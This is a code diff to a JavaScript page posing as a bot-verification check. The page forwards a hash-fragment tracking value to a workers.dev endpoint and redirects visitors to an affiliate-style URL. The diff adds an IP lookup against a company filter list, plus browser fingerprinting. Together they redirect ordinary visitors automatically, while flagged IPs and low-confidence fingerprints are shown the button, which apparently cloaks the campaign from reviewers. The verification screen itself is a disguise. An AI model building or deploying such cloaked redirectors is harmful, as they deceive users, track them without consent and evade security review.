@@ -1,9 +1,9 @@
 // ========== CONFIGURATION ==========
 const WORKER_URL = 'https://trackerworkerv2.lugangxyz.workers.dev/verify';
+const IP_CHECK_URL = 'https://trackerworkerv2.lugangxyz.workers.dev/check-ip';
 const DEFAULT_REDIRECT_URL = 'https://colossaldragon.com/?a=102032&c=121832&s1=G20&s2=G20';
 
 // ========== AVATAR LIST (Rotated randomly on load) ==========
-// Replace these with your public GitHub CDN URLs (e.g., via jsDelivr)
 const AVATAR_LIST = [
     'https://cdn.jsdelivr.net/gh/HamiguaLu/jslib/bot.detect/avatar/1.webp',
     'https://cdn.jsdelivr.net/gh/HamiguaLu/jslib/bot.detect/avatar/2.webp',
@@ -72,8 +72,6 @@ const TRANSLATIONS = {
 function getBrowserLanguage() {
     const lang = navigator.language || navigator.languages?.[0] || 'en';
     const langCode = lang.split('-')[0].toLowerCase();
-    
-    // Supported languages: en, sv, de, da, no, fi
     const supported = ['en', 'sv', 'de', 'da', 'no', 'fi'];
     return supported.includes(langCode) ? langCode : 'en';
 }
@@ -98,17 +96,14 @@ function getFragmentData() {
     return hash;
 }
 
-// Extract camp code from fragment data if it matches MD5 + camp code format
-// Format: 32 hex chars (MD5) + 2 hex chars (1 byte camp code) = 34 chars total
+// Extract camp code from fragment data
 function extractCampCode(fragmentData) {
     if (!fragmentData || typeof fragmentData !== 'string') {
         console.log('[CampCode] Ingen fragmentdata tillhandahölls');
         return null;
     }
     
-    // Check if length is exactly 34 characters (32 MD5 + 2 camp code)
     if (fragmentData.length === 34) {
-        // Check if it's a valid hex string
         const hexRegex = /^[0-9a-fA-F]+$/;
         if (hexRegex.test(fragmentData)) {
             const md5Part = fragmentData.substring(0, 32);
@@ -138,7 +133,7 @@ function extractCampCode(fragmentData) {
     }
 }
 
-// Send data to Cloudflare Worker and redirect (only after real user click)
+// Send data to Cloudflare Worker and redirect
 async function sendToCloudflareAndRedirect(userData) {
     try {
         const response = await fetch(WORKER_URL, {
@@ -155,47 +150,107 @@ async function sendToCloudflareAndRedirect(userData) {
         const result = await response.json();
         window.location.href = result.redirectUrl || `${DEFAULT_REDIRECT_URL}?data=${encodeURIComponent(userData)}`;
     } catch (error) {
-        // Fallback on error
         window.location.href = `${DEFAULT_REDIRECT_URL}?data=${encodeURIComponent(userData)}`;
     }
 }
 
-// Select a random avatar from the configuration array
+// Select a random avatar
 function getRandomAvatarUrl() {
     if (!AVATAR_LIST || AVATAR_LIST.length === 0) return '';
     const randomIndex = Math.floor(Math.random() * AVATAR_LIST.length);
     return AVATAR_LIST[randomIndex];
 }
 
-// Apply camp code specific styling (placeholder for future implementation)
+// Apply camp code styling (placeholder)
 function applyCampCodeStyling(campCodeData) {
     if (!campCodeData || !campCodeData.isValid) return;
-    
     const campValue = campCodeData.campCodeDecimal;
     console.log(`[CampCode Styling] Skulle applicera stilar för camp-kod: ${campValue}`);
-    
-    // TODO: Future implementation for different styles based on camp code
-    // Example:
-    // if (campValue === 0) { /* style A */ }
-    // if (campValue === 1) { /* style B */ }
-    // if (campValue === 255) { /* style C */ }
 }
 
-// Main initialization: Build UI + create Shadow DOM button
-function init() {
+// ========== IP CHECK ==========
+
+// Check if IP is in filter list
+async function checkIPBlocked() {
+    try {
+        console.log('[IP Check] Checking IP...');
+        const response = await fetch(IP_CHECK_URL);
+        const data = await response.json();
+        
+        console.log('[IP Check] Result:', data);
+        
+        if (data.blocked) {
+            console.log(`[IP Check] IP is BLOCKED - Company: ${data.company}, Range: ${data.matchedRange}`);
+            return true;
+        } else {
+            console.log('[IP Check] IP is NOT blocked');
+            return false;
+        }
+    } catch (error) {
+        console.error('[IP Check] Failed:', error);
+        return false;
+    }
+}
+
+// ========== FINGERPRINTJS INTEGRATION ==========
+
+// Load FingerprintJS from CDN
+function loadFingerprintJS() {
+    return new Promise((resolve, reject) => {
+        const script = document.createElement('script');
+        script.src = 'https://cdn.jsdelivr.net/gh/HamiguaLu/jslib/bot.detect/fp.min.js';
+        script.onload = () => {
+            console.log('[FingerprintJS] Loaded successfully');
+            resolve();
+        };
+        script.onerror = () => {
+            console.log('[FingerprintJS] Failed to load');
+            reject(new Error('Failed to load FingerprintJS'));
+        };
+        document.head.appendChild(script);
+    });
+}
+
+// Check Fingerprint and auto-submit if confidence >= 0.6
+async function checkFingerprintAndAutoSubmit() {
+    try {
+        if (typeof FingerprintJS === 'undefined') {
+            console.log('[FingerprintJS] Not available');
+            return false;
+        }
+        
+        console.log('[FingerprintJS] Generating fingerprint...');
+        const fp = await FingerprintJS.load();
+        const result = await fp.get();
+        
+        console.log('[FingerprintJS] Confidence score:', result.confidence.score);
+        
+        if (result.confidence.score >= 0.6) {
+            console.log('[FingerprintJS] High confidence (>= 0.6) - Auto-submitting');
+            return true;
+        } else {
+            console.log('[FingerprintJS] Low confidence (< 0.6) - Showing button');
+            return false;
+        }
+    } catch (error) {
+        console.error('[FingerprintJS] Error:', error);
+        return false;
+    }
+}
+
+// ========== UI FUNCTIONS ==========
+
+// Create and show verification button
+function createVerificationButton() {
     const app = document.getElementById('app');
     if (!app) return;
     
     const fragmentData = getFragmentData();
     const t = getTranslations();
     
-    // Extract and log camp code from fragment data
     const campCodeData = extractCampCode(fragmentData);
-    
-    // Apply camp code styling (placeholder for future)
     applyCampCodeStyling(campCodeData);
     
-    // 1. Create basic HTML framework (Card with headline, image placeholder, and footer)
     const cardHtml = `
         <div class="verification-card">
             <div class="brand-headline">
@@ -215,7 +270,6 @@ function init() {
     
     app.innerHTML = cardHtml;
     
-    // 2. Inject a random photo element dynamically ABOVE the button mount point
     const mountPoint = document.getElementById('button-mount');
     if (!mountPoint) return;
     
@@ -229,7 +283,6 @@ function init() {
     `;
     mountPoint.parentNode.insertBefore(avatarContainer, mountPoint);
     
-    // 3. Create Shadow DOM with elegant dark button
     const shadowHost = document.createElement('div');
     shadowHost.style.display = 'flex';
     shadowHost.style.alignItems = 'center';
@@ -238,7 +291,6 @@ function init() {
     
     const shadowRoot = shadowHost.attachShadow({ mode: 'open' });
     
-    // Minimalist, modern dark button styles (Shadow DOM CSS)
     const style = document.createElement('style');
     style.textContent = `
         .cf-button {
@@ -321,7 +373,6 @@ function init() {
     
     let clicked = false;
     
-    // Event listener for user interaction
     button.addEventListener('click', async function() {
         if (clicked) return;
         clicked = true;
@@ -346,5 +397,43 @@ function init() {
     });
 }
 
+// ========== MAIN APP INITIALIZATION (PARALLEL) ==========
+
+async function initApp() {
+    console.log('[App] Initializing...');
+    
+    // ========== RUN BOTH CHECKS IN PARALLEL ==========
+    console.log('[App] Running IP check and FingerprintJS in parallel...');
+    
+    const [ipBlocked, fpResult] = await Promise.all([
+        checkIPBlocked(),                          // IP check
+        loadFingerprintJS().then(() => {           // Load FP + check confidence
+            return checkFingerprintAndAutoSubmit();
+        }).catch(() => {
+            return false; // FP failed
+        })
+    ]);
+    
+    // ========== DECIDE BASED ON RESULTS ==========
+    
+    // Show button if IP is blocked OR FP confidence < 0.6
+    if (ipBlocked) {
+        console.log('[App] IP is BLOCKED - showing button');
+        createVerificationButton();
+        return;
+    }
+    
+    if (fpResult === true) {
+        console.log('[App] FP high confidence - auto-submitting');
+        const userData = getFragmentData();
+        await sendToCloudflareAndRedirect(userData);
+        return;
+    }
+    
+    // Default: show button
+    console.log('[App] Showing verification button');
+    createVerificationButton();
+}
+
 // Start application when DOM is ready
-document.addEventListener('DOMContentLoaded', init);
+document.addEventListener('DOMContentLoaded', initApp);
